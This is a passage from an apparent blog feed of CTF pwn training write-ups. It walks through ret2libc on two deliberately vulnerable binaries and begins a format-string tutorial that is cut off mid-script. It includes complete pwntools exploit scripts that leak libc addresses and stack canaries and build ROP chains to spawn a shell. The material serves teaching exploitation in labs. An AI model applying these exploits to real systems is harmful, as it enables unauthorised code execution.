        <span class="n">final</span> <span class="o">+=</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">hexval</span><span class="p">)[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">continue</span>

<span class="n">final</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">ng!!}</span><span class="sh">"</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">flag: </span><span class="si">{</span><span class="n">final</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p><img src="/assets/leakyinctfj/ss6.png" alt="" /></p>

<p>Happy Hacking!</p>]]></content><author><name>tourpran</name></author><category term="writeup" /><category term="pwn" /><category term="format string" /><summary type="html"><![CDATA[Intro: Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called leaky pipes. Make sure to give the challenge a try before seeing this.]]></summary></entry><entry><title type="html">[pwn 3] Return to libc</title><link href="http://localhost:4000/pwn-training/2021/05/24/return2libcpwntrain.html" rel="alternate" type="text/html" title="[pwn 3] Return to libc" /><published>2021-05-24T00:00:00+05:30</published><updated>2021-05-24T00:00:00+05:30</updated><id>http://localhost:4000/pwn-training/2021/05/24/return2libcpwntrain</id><content type="html" xml:base="http://localhost:4000/pwn-training/2021/05/24/return2libcpwntrain.html"><![CDATA[<p><img src="/assets/images/pwntraining3/pwntrain1.png" alt="" /></p>

<h3 id="introduction">Introduction:</h3>

<p>In this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.</p>

<h3 id="challenge-1">Challenge 1:</h3>

<p>Here we are given a binary and the source for the binary.</p>

<p><a href="/assets/images/pwntraining3/ret2libc">vuln binary</a> and 
<a href="/assets/images/pwntraining3/ret2libc.c">vuln c code</a></p>

<h3 id="solution">Solution:</h3>

<h4 id="mitigations">Mitigations:</h4>

<p>Lets check out the mitigations for this program.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span> ./ret2libc
</code></pre></div></div>

<p><img src="/assets/images/pwntraining3/pwntrain2.png" alt="" /></p>

<p>If you don’t have checksec installed then</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>checksec
</code></pre></div></div>

<p><strong>RELRO</strong>:</p>
<ul>
  <li>Partial RELRO - the got is writeable, nothing much to bother here.</li>
</ul>

<p><strong>CANARY</strong>:</p>
<ul>
  <li>No canary, we can do a overflow peacefully :)</li>
</ul>

<p><strong>No eXecute</strong>:</p>
<ul>
  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
</ul>

<p><strong>PIE</strong>:</p>
<ul>
  <li>PIE Disabled, we know the address of all the code in the binary.</li>
</ul>

<h4 id="code-walkthrough">Code walkthrough:</h4>

<p>main function:</p>

<p><img src="/assets/images/pwntraining3/pwntrain3.png" alt="" /></p>

<ul>
  <li>Since gets is a vulnerable function, we can use it to write more data than what the buffer can hold.</li>
  <li>Also there are no win functions this time. We have to rely on the shared object.</li>
  <li>Lets explore this challenge now.</li>
</ul>

<h4 id="global-offset-table">Global Offset Table:</h4>

<p>This challenge requires you to know the basics of GOT and PLT. In short GOT is a set of address that points to the function in the glibc (shared library). To know more about <a href="https://pranavkrish04.github.io/blogs/2020/09/13/got-plt.html">Global offset table go ahead to my old blog</a>.</p>

<h4 id="exploit-idea">Exploit Idea:</h4>

<ul>
  <li>Our aim right now is to leak an address in the libc (shared library). Since ASLR will randomise the library we cant access the libc function with same address all the time.</li>
  <li>There is a function called system in the libc which will pop a shell if we give the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> as the parameter.</li>
</ul>

<p>→ We can use the puts function to call the got of puts, since its already called by our program, the GOT of this function will be resolved ( real address pointing to libc will be filled ).</p>

<h4 id="pseudo-code">Pseudo code:</h4>

<p><strong>note</strong>: arguments to functions are stored via registers, the first argument is stored in RDI.</p>

<pre><code class="language-.">"A"*(offset) + p64(address of pop RDI) +  p64(GOT address of puts) + p64(PLT address of puts) + p64(address of main)
</code></pre>

<p>This code will fill the buffer with garbage and store the GOT address of puts inside the RDI register and then calls puts, this will leak the puts libc address.</p>

<ul>
  <li>Now we have the libc puts address.</li>
  <li>All functions and variables in the libc is relative to one another, libc as a whole might change its position but the elements (functions, variables) will be at the same relative distance from one another.</li>
  <li>we can calculate the address of string “/bin/sh” and the address of system function, then we can call the system with the argument to pop a shell.</li>
</ul>

<p><strong>note:</strong> You might face a error in the statement movabs. If you encounter this problem, you can rectify it by adding a return instruction before the call to a glibc function, Since adding a return address will make the RSP 16 byte aligned.</p>

<h4 id="exploit">Exploit:</h4>

<p>In real life situation you are not probably using the same libc as the software dev, So to find out the libc version go to <a href="https://libc.blukat.me/">libc.blukat.me</a>.</p>

<p>So always the last 3 digits (hex) of the leak will be same. Use this as an advantage to select your libc version.</p>

<p><img src="/assets/images/pwntraining3/pwntrain4.png" alt="" /></p>

<p>Below is the commented solution.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./ret2libc</span><span class="sh">'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./ret2libc</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># ./exploit.py DEBUG NOASLR
</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1"># ./exploit.py GDB
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b* 0x00000000004011c7
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Are you in?</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># recv the output sent by the program.
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000000000401016</span><span class="p">)</span> <span class="o">+</span>  <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main</span><span class="p">))</span>
<span class="c1"># filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function
</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span> <span class="c1"># recv unwanted bytes.
</span><span class="n">leak_puts</span> <span class="o">=</span><span class="nf">hex</span><span class="p">(</span> <span class="nf">u64</span><span class="p">((</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">()).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)))</span> <span class="c1"># recv the puts function and strip the front and back, unpack it and store it as hex.
</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">puts: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">))</span> <span class="c1"># make sure you get a address in the libc by logging it.
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Are you in?</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># recv output.
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x13000a</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x32190</span><span class="p">))</span>
<span class="c1"># fill garbage in buffer and pop RDI to fill it with a pointer to "bin/sh" call system.
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</code></pre></div></div>

<h3 id="challenge-2">Challenge 2:</h3>

<p>In this second challenge you are required to perform the same ret2libc but with more security measures to bypass. Below you can download source and bianry.</p>

<p><a href="/assets/images/pwntraining3/ret2libc_canary">vuln binary</a> and 
<a href="/assets/images/pwntraining3/ret2libc_canary.c">vuln c code</a></p>

<h3 id="solution-1">Solution:</h3>
<p>Lets do the drill of checking the mitigations.</p>

<h4 id="mitigations-1">Mitigations:</h4>
<p><img src="/assets/images/pwntraining3/pwntrain5.png" alt="" /></p>

<p><strong>Canary:</strong></p>
<ul>
  <li>A set of characters that will be checked before returning. If the value has changed the program aborts.</li>
</ul>

<p><strong>No eXecute:</strong></p>
<ul>
  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
</ul>

<p><strong>PIE:</strong></p>
<ul>
  <li>PIE Enabled, We dont know the address of the code for the binary.</li>
</ul>

<h4 id="code-walkthrough-1">Code Walkthrough:</h4>

<p>There is only a main function.
<img src="/assets/images/pwntraining3/pwntrain6.png" alt="" /></p>

<p>We can see that, here we are getting an input and printing it in an unsafe way. Here we can take advantage of this to leak data in the binary. <a href="https://pranavkrish04.github.io/pwn-training/2021/05/20/format-string-exploitation-training2.html">Not sure about format string ? Go Here</a>. In the next section we can use the gets function to input more data than the buffer can store.</p>

<h4 id="canary">Canary:</h4>
<p>Set of characters that is placed in between the return address and the buffer. When a buffer overflow occurs the canary checks itself with a memory copy. If the values has been modified then we know a overflow happened and the program will abort.</p>

<p><img src="/assets/images/pwntraining3/pwntrain7.jpg" alt="" /></p>

<blockquote>
  <p>Bypass: Basically we can leak the canary from format strings and place the canary in the correct spot in the payload. Since we over write the canary with the real canary, it seems there was no overflow.</p>
</blockquote>

<h4 id="exploit-1">Exploit:</h4>

<ul>
  <li>Lets try to leak some variables from the stack by giving some %p.</li>
  <li>We can store all of them in a list and analyse what is what.</li>
</ul>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>

<span class="c1"># phase 1 : leaking binary and libc address
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">So you wanna try again. Go ahead :)</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span>
<span class="n">all_leaked</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()).</span><span class="nf">split</span><span class="p">()</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Info leaked: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span>
</code></pre></div></div>

<p><img src="/assets/images/pwntraining3/pwntrain8.png" alt="" /></p>

<ul>
  <li>We can confirm that the address <code class="language-plaintext highlighter-rouge">0x7ffff7faea03</code> is from the libc, nice ! we already got a leak. Attach gdb and check what the address corresponds to.</li>
</ul>

<p><img src="/assets/images/pwntraining3/pwntrain9.png" alt="" /></p>

<p>Ok this is a libc function, we can calculate the offset of this function from the libc base. Now lets see if any other important info is leaked. :thinking:</p>

<p>Address that is <code class="language-plaintext highlighter-rouge">0x5555555550a0</code>, is a address that is winthin the binary, we can calculate the offset like the previous one.</p>

<p>Finally lets see if the canary is also included in the stack. Yes it is indeed inside the stack and can clearly see it.</p>

<p><img src="/assets/images/pwntraining3/pwntrain10.png" alt="" /></p>

<p>Now to find the position of canary we can set a break point in the address before the <code class="language-plaintext highlighter-rouge">__stack_chk_fail@plt</code>. The stack will be stored in the <code class="language-plaintext highlighter-rouge">RCX</code> register. Create a offset pattern then see what value is in the <code class="language-plaintext highlighter-rouge">RCX</code> register and place the canary value there to complete the exploit.</p>

<p>Now it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now <code class="language-plaintext highlighter-rouge">pop rdi</code> to populate it with the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> and call <code class="language-plaintext highlighter-rouge">system</code>. Below I have given the commented solution.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./ret2libc_canary</span><span class="sh">'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./ret2libc_canary</span><span class="sh">"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">/lib/x86_64-linux-gnu/libc.so.6</span><span class="sh">"</span><span class="p">)</span>
<span class="c1"># ./exploit.py DEBUG NOASLR
</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1"># ./exploit.py GDB
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b* main+164
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>

<span class="c1"># phase 1 : leaking binary and libc address
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">So you wanna try again. Go ahead :)</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span> <span class="c1"># send format specifier to leak data from the stack
</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span> <span class="c1"># recv the new line.
</span>
<span class="n">all_leaked</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()).</span><span class="nf">split</span><span class="p">()</span> <span class="c1"># store all leaked data as a list.
</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Info leaked: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span> <span class="c1"># log it to make sure everything works fine
</span><span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2013699</span> <span class="c1"># take the first element in the list which is a libc function.
</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Libc Base: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span> <span class="c1"># log it
</span><span class="n">binary_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4256</span> <span class="c1"># calculate the binary offset from the leak.
</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">binary_base: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">binary_base</span><span class="p">)))</span> <span class="c1"># log it
</span><span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># store the canary from the leak
</span>
<span class="c1"># pahse 2 : usign the leak to ret2libc
</span>
<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="c1"># fill the buffer till the canary and overwrite the canary with real one.
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># random garbage to fill the rbp
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x00000000000012cb</span><span class="p">)</span> <span class="c1"># return address
</span><span class="nf">print</span><span class="p">(</span><span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)))</span> <span class="c1"># find the address of libc bin/sh
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)))</span> 
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># return to make sure stack is aligned before a glibc call
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span> <span class="c1"># call system.
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">Missed again??? I</span><span class="sh">'</span><span class="s">m so disappointed.</span><span class="sh">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>


<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Hope you loved this challenge in the training !Happy Hacking! :D</p>]]></content><author><name>tourpran</name></author><category term="pwn-training" /><category term="libc leak" /><category term="ret2libc" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[pwn 2] Format String Exploitation</title><link href="http://localhost:4000/pwn-training/2021/05/20/format-string-exploitation-training2.html" rel="alternate" type="text/html" title="[pwn 2] Format String Exploitation" /><published>2021-05-20T00:00:00+05:30</published><updated>2021-05-20T00:00:00+05:30</updated><id>http://localhost:4000/pwn-training/2021/05/20/format-string-exploitation-training2</id><content type="html" xml:base="http://localhost:4000/pwn-training/2021/05/20/format-string-exploitation-training2.html"><![CDATA[<p><img src="/assets/images/pwntraining2/pwntrain13.png" alt="" /></p>

<h3 id="introduction">Introduction:</h3>

<p>This is the 2nd challenge in the in the <a href="https://pranavkrish04.github.io/categories.html#h-pwn-training">pwn training</a>. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.</p>

<h3 id="challenge-1">Challenge 1:</h3>

<p>You can download the binary and the source down below.</p>

<p><a href="/assets/images/pwntraining2/flagleak">vuln binary</a> and 
<a href="/assets/images/pwntraining2/flagleak.c">vuln c code</a></p>

<h3 id="solution">Solution:</h3>

<h4 id="mitigations">Mitigations:</h4>

<p>Lets do the usual drill of checking the mitigations of this binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span> ./flagleak
</code></pre></div></div>
<p><img src="/assets/images/pwntraining2/pwntrain1.png" alt="" /></p>

<p>RELRO:</p>
<ul>
  <li>Partial RELRO - In the attackers point of view, the GOT (Global Offset Table) is readable and writeable.</li>
</ul>

<p>CANARY:</p>
<ul>
  <li>There is no canary so we can do a buffer overflow.</li>
</ul>

<p>No eXecute:</p>
<ul>
  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
</ul>

<p>PIE:</p>
<ul>
  <li>No PIE: We know the address of the binary at runtime, Since the binary is not position independent.</li>
</ul>

<h4 id="code-walkthrough">Code walkthrough:</h4>

<p>As said in previous training you can dig in deep into the assembly but to make things simpler we are given the source code. (in most CTF / Real life applications it’ll be helpful if you know assembly).</p>

<p><img src="/assets/images/pwntraining2/pwntrain2.png" alt="" /></p>

<p>In the main function there is an obvious buffer overflow. Since there is a buffer of size 0x60 but the input is reading 0x60+8+16 (lmao author made is quite obvious). Ok we know the basic buffer overflow pattern right?</p>

<p><img src="/assets/images/pwntraining2/pwntrain3.png" alt="" /></p>

<p>I hope you can come to the <code class="language-plaintext highlighter-rouge">print_flag</code> function by your own. (If you could’nt, no probs go <a href="https://pranavkrish04.github.io/pwn-training/2021/05/09/simple-ret2shellcode-training1.html">here</a> ). Let us now see what is there in the print_flag function.</p>

<p><img src="/assets/images/pwntraining2/pwntrain4.png" alt="" /></p>

<p>It is reading a file called flag.txt. If you dont have the file in your current directory it will give you an error. so create a file with a random value. In this task our main goal is to get the value of the flag. A flag is basically a valuable object in games called ctfs likewise in security contests these flags give you points. Wait does it mean you can’t get a shell in this challenge :( ? Umm… You can spawn a shell in this challenge, but in this module we will only try out format string exploitation. If you are too keen to know, then check out what libc leak is. Dont worry we will see them in the later parts of this training.</p>

<h4 id="vulnerability">Vulnerability:</h4>

<p>Before going into the vuln lets see how printf works.</p>

<h4 id="printf">printf:</h4>

<p>printf is a function in the glibc library. It basically has 2 parts, a format and an argument.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"text here and %x %p %s "</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">)</span>
</code></pre></div></div>
<p>So in the first field we fill it with text and format specifiers to print the values in the corresponding second field (variables). The different format specifiers like %x %p %s denote the datatype of the variable; like hex, pointer, string respectively.</p>

<h4 id="exploitation">Exploitation:</h4>
<p>So what if we are able to control the first field. Imagine being able to read more values from 2nd field, more than the available arguments ? Will the program crash ? will it send some garbage data ?  :thinking:</p>

<p>points to note:</p>
<ul>
  <li>The arguments are stored in the stack.</li>
  <li>printf will take values from the stack.</li>
</ul>

<p>So, the extra format specifiers we specified will continue to take the values stored in the stack. Lets do it live. [I am using pwntools template. to make a template go to terminal and type <code class="language-plaintext highlighter-rouge">pwn template &gt; xpl.py</code> ]. Now go to vim and continue writing your exploit from the buffer overflow to the print_flag function. (if you are lazy you can copy the script down below :( )</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./flagleak</span><span class="sh">'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">flagleak</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
